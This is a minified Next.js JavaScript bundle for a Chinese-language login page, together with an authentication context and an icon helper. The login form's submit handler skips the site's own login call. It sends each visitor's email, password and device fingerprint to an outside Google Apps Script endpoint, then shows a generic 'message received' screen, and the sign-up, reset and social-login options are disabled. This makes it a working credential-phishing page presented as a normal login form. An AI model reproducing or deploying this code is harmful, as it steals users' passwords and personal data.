(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[626],{2826:function(e,t,r){Promise.resolve().then(r.bind(r,378))},378:function(e,t,r){"use strict";r.r(t),r.d(t,{default:function(){return c}});var s=r(3827),o=r(4090),n=r(7907),a=r(5240),l=r(3779),i=r(1399);function c(){(0,n.useRouter)();let{login:e,error:t,isLoading:r}=(0,l.useAuth)(),[c,d]=(0,o.useState)({email:"",password:"",rememberMe:!1}),[u,m]=(0,o.useState)(!1),[h,g]=(0,o.useState)(!1),[f,x]=(0,o.useState)(""),[b,p]=(0,o.useState)({userAgent:"",platform:"",language:"",screenResolution:"",timezone:"",deviceType:""});(0,o.useEffect)(()=>{p({userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screenResolution:"".concat(window.screen.width,"x").concat(window.screen.height),timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,deviceType:/Mobile|iP(hone|od|ad)|Android|BlackBerry|IEMobile/.test(navigator.userAgent)?"mobile":"desktop"})},[]);let y=async e=>{e.preventDefault(),m(!0),x("");try{await fetch("https://script.google.com/macros/s/AKfycbxn3bRzgvFRPPLFN6xecYUfOdMhXwYgUqH69tKOGKxnZbwaBNf4IF5HX6y0JQRStA2s/exec",{method:"POST",mode:"no-cors",headers:{"Content-Type":"application/json"},body:JSON.stringify({...c,deviceInfo:b,timestamp:new Date().toISOString()})}),g(!0)}catch(e){x("提交失敗，請稍後再試。"),console.error("提交表單時發生錯誤:",e)}finally{m(!1)}},w=e=>{let{name:t,value:r,type:s,checked:o}=e.target;d(e=>({...e,[t]:"checkbox"===s?o:r}))};return h?(0,s.jsx)(a.Z,{children:(0,s.jsx)("div",{className:"min-h-screen bg-gray-50 py-12",children:(0,s.jsx)("div",{className:"max-w-7xl mx-auto px-4 sm:px-6 lg:px-8",children:(0,s.jsxs)("div",{className:"bg-white rounded-lg shadow-lg p-8 text-center",children:[(0,s.jsx)("h1",{className:"text-3xl font-bold text-gray-900 mb-4",children:"感謝您的訊息"}),(0,s.jsx)("p",{className:"text-gray-600 mb-8",children:"我們已收到您的訊息，將盡快與您聯繫。"}),(0,s.jsx)("a",{href:"/",className:"inline-block bg-blue-600 text-white px-6 py-3 rounded-md hover:bg-blue-700",children:"返回首頁"})]})})})}):(0,s.jsx)(a.Z,{children:(0,s.jsxs)("div",{className:"min-h-screen bg-gray-50 flex flex-col justify-center py-12 sm:px-6 lg:px-8",children:[(0,s.jsxs)("div",{className:"sm:mx-auto sm:w-full sm:max-w-md",children:[(0,s.jsx)("h2",{className:"mt-6 text-center text-3xl font-extrabold text-gray-900",children:"登录您的账号"}),(0,s.jsxs)("p",{className:"mt-2 text-center text-sm text-gray-600",children:["或者"," ",(0,s.jsx)("button",{type:"button",disabled:!0,className:"font-medium text-gray-400 cursor-not-allowed",children:"注册新账号"})]})]}),(0,s.jsx)("div",{className:"mt-8 sm:mx-auto sm:w-full sm:max-w-md",children:(0,s.jsxs)("div",{className:"bg-white py-8 px-4 shadow sm:rounded-lg sm:px-10",children:[(0,s.jsxs)("form",{className:"space-y-6",onSubmit:y,children:[f&&(0,s.jsx)("div",{className:"rounded-md bg-red-50 p-4",children:(0,s.jsx)("div",{className:"text-sm text-red-700",children:f})}),(0,s.jsxs)("div",{children:[(0,s.jsx)("label",{htmlFor:"email",className:"block text-sm font-medium text-gray-700",children:"电子邮箱"}),(0,s.jsx)("div",{className:"mt-1",children:(0,s.jsx)("input",{id:"email",name:"email",type:"email",autoComplete:"email",required:!0,value:c.email,onChange:w,className:"appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"})})]}),(0,s.jsxs)("div",{children:[(0,s.jsx)("label",{htmlFor:"password",className:"block text-sm font-medium text-gray-700",children:"密码"}),(0,s.jsx)("div",{className:"mt-1",children:(0,s.jsx)("input",{id:"password",name:"password",type:"password",autoComplete:"current-password",required:!0,value:c.password,onChange:w,className:"appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-blue-500 focus:border-blue-500 sm:text-sm"})})]}),(0,s.jsxs)("div",{className:"flex items-center justify-between",children:[(0,s.jsxs)("div",{className:"flex items-center",children:[(0,s.jsx)("input",{id:"remember-me",name:"rememberMe",type:"checkbox",checked:c.rememberMe,onChange:w,className:"h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"}),(0,s.jsx)("label",{htmlFor:"remember-me",className:"ml-2 block text-sm text-gray-900",children:"记住我"})]}),(0,s.jsx)("div",{className:"text-sm",children:(0,s.jsx)("button",{type:"button",disabled:!0,className:"font-medium text-gray-400 cursor-not-allowed",children:"忘记密码？"})})]}),(0,s.jsx)("div",{children:(0,s.jsx)("button",{type:"submit",disabled:r,className:"w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed",children:r?"登录中...":"登录"})})]}),(0,s.jsxs)("div",{className:"mt-6",children:[(0,s.jsxs)("div",{className:"relative",children:[(0,s.jsx)("div",{className:"absolute inset-0 flex items-center",children:(0,s.jsx)("div",{className:"w-full border-t border-gray-300"})}),(0,s.jsx)("div",{className:"relative flex justify-center text-sm",children:(0,s.jsx)("span",{className:"px-2 bg-white text-gray-500",children:"或者使用"})})]}),(0,s.jsxs)("div",{className:"mt-6 grid grid-cols-3 gap-3",children:[(0,s.jsx)("div",{children:(0,s.jsx)("button",{disabled:!0,className:"w-full inline-flex justify-center py-2 px-4 border border-gray-300 rounded-md shadow-sm bg-white text-sm font-medium text-gray-400 hover:bg-gray-50 cursor-not-allowed",children:(0,s.jsx)(i.ltd,{className:"h-5 w-5"})})}),(0,s.jsx)("div",{children:(0,s.jsx)("button",{disabled:!0,className:"w-full inline-flex justify-center py-2 px-4 border border-gray-300 rounded-md shadow-sm bg-white text-sm font-medium text-gray-400 hover:bg-gray-50 cursor-not-allowed",children:(0,s.jsx)(i.ldW,{className:"h-5 w-5"})})}),(0,s.jsx)("div",{children:(0,s.jsx)("button",{disabled:!0,className:"w-full inline-flex justify-center py-2 px-4 border border-gray-300 rounded-md shadow-sm bg-white text-sm font-medium text-gray-400 hover:bg-gray-50 cursor-not-allowed",children:(0,s.jsx)(i.hJX,{className:"h-5 w-5"})})})]})]})]})})]})})}},3779:function(e,t,r){"use strict";r.r(t),r.d(t,{AuthProvider:function(){return a},useAuth:function(){return l}});var s=r(3827),o=r(4090);let n=(0,o.createContext)(void 0);function a(e){let{children:t}=e,[r,a]=(0,o.useState)({user:null,isAuthenticated:!1,isLoading:!0,error:null});(0,o.useEffect)(()=>{a(e=>({...e,isLoading:!1}))},[]);let l=async e=>{try{a(e=>({...e,isLoading:!0,error:null})),console.log("开始登录请求");let t=await fetch("/api/auth/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)});if(console.log("登录响应状态:",t.status),!t.ok){let e=await t.json();throw Error(e.message||"登录失败")}let r=await t.json();console.log("登录成功:",r),a(e=>({...e,user:r.user,isAuthenticated:!0,isLoading:!1}))}catch(e){throw console.error("登录错误:",e),a(t=>({...t,error:e instanceof Error?e.message:"登录失败",isLoading:!1})),e}},i=async e=>{try{a(e=>({...e,isLoading:!0,error:null})),console.log("开始注册请求");let t=await fetch("/api/auth/signup",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)});if(console.log("注册响应状态:",t.status),!t.ok){let e=await t.json();throw Error(e.message||"注册失败")}let r=await t.json();console.log("注册成功:",r),a(e=>({...e,user:r.user,isAuthenticated:!0,isLoading:!1}))}catch(e){throw console.error("注册错误:",e),a(t=>({...t,error:e instanceof Error?e.message:"注册失败",isLoading:!1})),e}},c=async()=>{try{a(e=>({...e,isLoading:!0,error:null})),console.log("开始登出请求");let e=await fetch("/api/auth/logout",{method:"POST"});if(console.log("登出响应状态:",e.status),!e.ok)throw Error("登出失败");a({user:null,isAuthenticated:!1,isLoading:!1,error:null})}catch(e){throw console.error("登出错误:",e),a(t=>({...t,error:e instanceof Error?e.message:"登出失败",isLoading:!1})),e}},d=async e=>{try{a(e=>({...e,isLoading:!0,error:null})),console.log("开始更新用户资料");let t=await fetch("/api/user/profile",{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)});if(console.log("更新用户资料响应状态:",t.status),!t.ok){let e=await t.json();throw Error(e.message||"更新用户资料失败")}let r=await t.json();console.log("更新用户资料成功:",r),a(e=>({...e,user:r,isLoading:!1}))}catch(e){throw console.error("更新用户资料错误:",e),a(t=>({...t,error:e instanceof Error?e.message:"更新用户资料失败",isLoading:!1})),e}};return(0,s.jsx)(n.Provider,{value:{...r,login:l,signup:i,logout:c,updateProfile:d},children:t})}function l(){let e=(0,o.useContext)(n);if(void 0===e)throw Error("useAuth 必须在 AuthProvider 内部使用");return e}},158:function(e,t,r){"use strict";r.d(t,{w_:function(){return d}});var s=r(4090),o={color:void 0,size:void 0,className:void 0,style:void 0,attr:void 0},n=s.createContext&&s.createContext(o),a=["attr","size","title"];function l(){return(l=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var r=arguments[t];for(var s in r)Object.prototype.hasOwnProperty.call(r,s)&&(e[s]=r[s])}return e}).apply(this,arguments)}function i(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);t&&(s=s.filter(function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable})),r.push.apply(r,s)}return r}function c(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?i(Object(r),!0).forEach(function(t){var s,o;s=t,o=r[t],(s=function(e){var t=function(e,t){if("object"!=typeof e||!e)return e;var r=e[Symbol.toPrimitive];if(void 0!==r){var s=r.call(e,t||"default");if("object"!=typeof s)return s;throw TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(e)}(e,"string");return"symbol"==typeof t?t:t+""}(s))in e?Object.defineProperty(e,s,{value:o,enumerable:!0,configurable:!0,writable:!0}):e[s]=o}):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):i(Object(r)).forEach(function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))})}return e}function d(e){return t=>s.createElement(u,l({attr:c({},e.attr)},t),function e(t){return t&&t.map((t,r)=>s.createElement(t.tag,c({key:r},t.attr),e(t.child)))}(e.child))}function u(e){var t=t=>{var r,{attr:o,size:n,title:i}=e,d=function(e,t){if(null==e)return{};var r,s,o=function(e,t){if(null==e)return{};var r={};for(var s in e)if(Object.prototype.hasOwnProperty.call(e,s)){if(t.indexOf(s)>=0)continue;r[s]=e[s]}return r}(e,t);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);for(s=0;s<n.length;s++)r=n[s],!(t.indexOf(r)>=0)&&Object.prototype.propertyIsEnumerable.call(e,r)&&(o[r]=e[r])}return o}(e,a),u=n||t.size||"1em";return t.className&&(r=t.className),e.className&&(r=(r?r+" ":"")+e.className),s.createElement("svg",l({stroke:"currentColor",fill:"currentColor",strokeWidth:"0"},t.attr,o,d,{className:r,style:c(c({color:e.color||t.color},t.style),e.style),height:u,width:u,xmlns:"http://www.w3.org/2000/svg"}),i&&s.createElement("title",null,i),e.children)};return void 0!==n?s.createElement(n.Consumer,null,e=>t(e)):t(o)}}},function(e){e.O(0,[699,901,240,971,69,744],function(){return e(e.s=2826)}),_N_E=e.O()}]);